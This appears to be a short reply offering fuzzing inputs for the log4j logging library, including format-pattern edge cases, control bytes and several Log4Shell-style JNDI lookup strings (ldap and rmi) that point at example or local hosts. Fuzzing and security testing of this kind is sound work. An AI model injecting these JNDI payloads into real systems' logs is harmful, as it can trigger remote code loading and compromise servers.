Here are some potential test cases for fuzzing the log4j library:

1. fuzzPatternLayout:
```
%.-9223372036854775808s
%t%r %p%n
${jndi:ldap://example.com}
```

2. fuzzLogMessages:
```
\x00\xFF\x1A\x1B\x1C\x1D\x1E\x1F
{"key": "value", "jndi": "${jndi:rmi://localhost:1099/jndiLookup}"}
${jndi:ldap:///example.com}
```

3. fuzzJsonLayout:
```
{"key": "value", "jndi": "${jndi:rmi://localhost:1099/jndiLookup}", "long": "a".repeat(1_000_000)}
${jndi:ldap:///example.com}
\x00\xFF\x1A\x1B\x1C\x1D\x1E\x1F
```

4. fuzzMessagePattern:
```
%t%r %p%n
{"key": "value", "jndi": "${jndi:rmi://localhost:1099/jndiLookup}"}
${jndi:ldap:///example.com}
\x00\xFF\x1A\x1B\x1C\x1D\x1E\x1F
```

Please note that these test cases may not trigger all possible bugs or edge cases, but they should help in identifying some interesting behavior in log4j.
